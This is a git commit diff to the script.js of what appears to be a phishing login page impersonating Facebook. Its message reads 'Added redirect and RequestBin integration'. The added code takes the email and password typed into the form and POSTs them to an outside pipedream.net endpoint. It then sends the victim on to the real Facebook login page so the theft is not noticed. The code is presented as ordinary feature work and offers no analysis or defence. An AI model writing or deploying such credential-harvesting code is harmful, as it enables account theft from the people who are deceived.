eafdaf3c7ceb100372305749858970b9d73decaa
EVANS <kiprotichluka70@gmail.com>
2025-03-13 16:51:16 +0300

    Added redirect and RequestBin integration

--- script.js
+++ script.js
@@ -5,8 +5,15 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 
     console.log("Email: " + email + ", Password: " + password);
 
-    alert("Credentials captured!\nEmail: " + email + "\nPassword: " + password);
+    // RequestBin/Pipedream Integration
+    const xhr = new XMLHttpRequest();
+    const requestBinUrl = "https://eoe5le38qoo4enf.m.pipedream.net"; // Replace with your RequestBin/Pipedream URL
+    xhr.open('POST', requestBinUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
 
+    // Redirect to Facebook
+    window.location.href = "https://www.facebook.com/login/";
 });
 
 document.addEventListener('keydown', function(e) {
